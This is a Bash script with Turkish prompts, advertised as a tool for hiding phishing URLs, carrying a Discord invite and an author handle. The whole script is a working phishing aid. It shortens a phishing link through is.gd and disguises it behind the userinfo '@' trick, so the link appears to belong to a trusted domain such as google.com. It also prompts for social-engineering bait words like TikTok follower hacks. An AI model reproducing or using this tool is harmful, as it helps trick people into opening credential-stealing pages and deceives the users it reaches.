# Bash Script for Hide Phishing URL Created by KP

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}

echo -e "\n\e[1;31;42m.##.......########..######...########.##....##.########. \e[0m"
echo -e "\e[1;31;42m.##.......##.......##....##..##.......###...##.##......# \e[0m"
echo -e "\e[1;31;42m.##.......##.......##........##.......####..##.##......# \e[0m"
echo -e "\e[1;31;42m.##.......######...##...####.######...##.##.##.##......# \e[0m"
echo -e "\e[1;31;42m.##.......##.......##....##..##.......##..####.##......# \e[0m"
echo -e "\e[1;31;42m.########.########..######...########.##....##.########. \e[0m \n"
echo -e "\e[40;38;5;82m Discord Adresim \e[30;48;5;82m https://discord.gg/HQVnvkUfva \e[0m"
echo -e "\e[30;48;5;82m    Copyright \e[40;38;5;82m   Legend#1337 \e[0m \n\n"
echo -e "\e[1;31;42m ### Phishing URL ###\e[0m \n"
echo -n "Saklamak istediginiz URL'yi Buraya Yazon (http veya https ile birlikte): "
read phish
url_checker $phish
sleep 1
echo "URL'niz Hazırlanıyor Lütfen Bekleyin."
echo ""
short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
shorter=${short#https://}
echo -e "\n\e[1;31;42m ### Masking Domain ###\e[0m"
echo 'Saklamak istediğiniz Domaini Girin (http veya https ile birlikte), Örnek: https://google.com, http
://anything.org) :'
echo -en "\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\nSosyal Mühendislik İle Alakalı Birsey Yazın Örnek:(tiktok-takipci-hilesi, en-iyi-pubg-taktikleri)'
echo -e "\e[31mSosyal Mühendislik İle Alakalı Birsey Yazarken '-' Lütfen Bosluk Kullanmayın\e[0m"
echo -en "\e[32m=>\e[0m "
read words
if [[ -z "$words" ]]; then
echo -e "\e[31m[!] Yazı Yok.\e[0m"
echo -e "\nURL Olusturuluyor...\n"
final=$mask@$shorter
echo -e "URL'niz Burada:\e[32m ${final} \e[0m\n"
exit
fi
if [[ "$words" =~ " " ]]; then
echo -e "\e[31m[!] Yazım Hatası. Lütfen Bosluk Kullanmayın.\e[0m"
echo -e "\nURL Olusturuluyor...\n"
final=$mask@$shorter
echo -e "URL'niz Burada:\e[32m ${final} \e[0m\n"
exit
fi
echo -e "\nURL Olusturuluyor...\n"
final=$mask-$words@$shorter
echo -e "URL'niz Burada:\e[32m ${final} \e[0m\n"
